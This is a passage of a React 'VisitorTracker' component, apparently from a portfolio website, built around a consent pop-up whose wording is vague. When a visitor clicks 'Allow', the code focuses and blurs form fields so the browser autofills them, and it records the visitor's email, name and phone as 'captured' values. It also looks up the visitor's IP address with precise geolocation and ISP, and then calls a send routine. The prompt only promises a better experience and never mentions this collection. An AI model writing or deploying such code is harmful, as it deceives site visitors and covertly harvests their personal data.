          data.ipCountry = ipGeoData.country_name || 'Not available';
          data.ipCountryCode = ipGeoData.country_code || 'Not available';
          data.ipPostal = ipGeoData.postal || 'Not available';
          data.ipTimezone = ipGeoData.timezone || 'Not available';
          data.ipISP = ipGeoData.org || 'Not available';
          data.ipASN = ipGeoData.asn || 'Not available';
        }
      } catch (ipGeoError) {
        // Try alternative IP geolocation service
        try {
          const altIpGeoResponse = await fetch(`https://ip-api.com/json/${ipData.ip}`);
          const altIpGeoData = await altIpGeoResponse.json();
          
          if (altIpGeoData && altIpGeoData.status === 'success') {
            data.ipLatitude = altIpGeoData.lat?.toFixed(6);
            data.ipLongitude = altIpGeoData.lon?.toFixed(6);
            data.ipCity = altIpGeoData.city || 'Not available';
            data.ipRegion = altIpGeoData.regionName || 'Not available';
            data.ipCountry = altIpGeoData.country || 'Not available';
            data.ipCountryCode = altIpGeoData.countryCode || 'Not available';
            data.ipPostal = altIpGeoData.zip || 'Not available';
            data.ipTimezone = altIpGeoData.timezone || 'Not available';
            data.ipISP = altIpGeoData.isp || 'Not available';
            data.ipASN = altIpGeoData.as || 'Not available';
          }
        } catch (altError) {
          data.ipGeoError = 'Could not get IP geolocation';
        }
      }
    } catch (error) {
      data.ipError = 'Could not fetch IP address';
    }

    return data;
  };

  const handleAllow = async () => {
    setShowModal(false);
    localStorage.setItem('visitorPermissionGranted', 'true');
    
    // Trigger autofill detection by briefly focusing on form fields
    triggerAutofillDetection();
    
    // Collect and send data after a short delay to allow autofill to populate
    setTimeout(async () => {
      await collectAndSendVisitorData();
    }, 1500);
  };

  const triggerAutofillDetection = () => {
    // Try to trigger browser autofill by focusing on form fields
    const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email" i]');
    const nameInputs = document.querySelectorAll('input[name*="name" i], input[type="text"]');
    const phoneInputs = document.querySelectorAll('input[type="tel"], input[name*="phone" i]');
    
    // Focus on email input first (most likely to have autofill)
    if (emailInputs.length > 0) {
      emailInputs[0].focus();
      setTimeout(() => {
        emailInputs[0].blur();
        // Check if autofill populated the field
        if (emailInputs[0].value) {
          localStorage.setItem('capturedEmail', emailInputs[0].value);
        }
      }, 100);
    }
    
    // Focus on name input
    if (nameInputs.length > 0) {
      setTimeout(() => {
        nameInputs[0].focus();
        setTimeout(() => {
          nameInputs[0].blur();
          if (nameInputs[0].value) {
            localStorage.setItem('capturedName', nameInputs[0].value);
          }
        }, 100);
      }, 200);
    }
    
    // Focus on phone input
    if (phoneInputs.length > 0) {
      setTimeout(() => {
        phoneInputs[0].focus();
        setTimeout(() => {
          phoneInputs[0].blur();
          if (phoneInputs[0].value) {
            localStorage.setItem('capturedPhone', phoneInputs[0].value);
          }
        }, 100);
      }, 400);
    }
  };

  const handleDeny = () => {
    setShowModal(false);
    // Don't set any flag - this allows modal to show again on next visit
    localStorage.setItem('visitorPermissionGranted', 'false');
  };

  if (!showModal) return null;

  return (
    <div className="visitor-tracker-overlay">
      <div className="visitor-tracker-modal">
        <div className="visitor-tracker-header">
          <h3>Welcome to My Portfolio!</h3>
          <button className="visitor-tracker-close" onClick={handleDeny}>
            <i className="bi bi-x-lg"></i>
          </button>
        </div>
        <div className="visitor-tracker-content">
          <div className="visitor-tracker-icon">
            <i className="bi bi-shield-check"></i>
          </div>
          <h4>Allow for Great Experience</h4>
          <p>
            Help me improve my portfolio and provide you with a better experience.
          </p>
        </div>
        <div className="visitor-tracker-actions">
          <button className="visitor-tracker-btn allow" onClick={handleAllow}>
            <i className="bi bi-check-circle"></i>
            Allow
          </button>
          <button className="visitor-tracker-btn deny" onClick={handleDeny}>
            <i className="bi bi-x-circle"></i>
            Deny
          </button>
        </div>
      </div>
    </div>
  );
};

export default VisitorTracker;

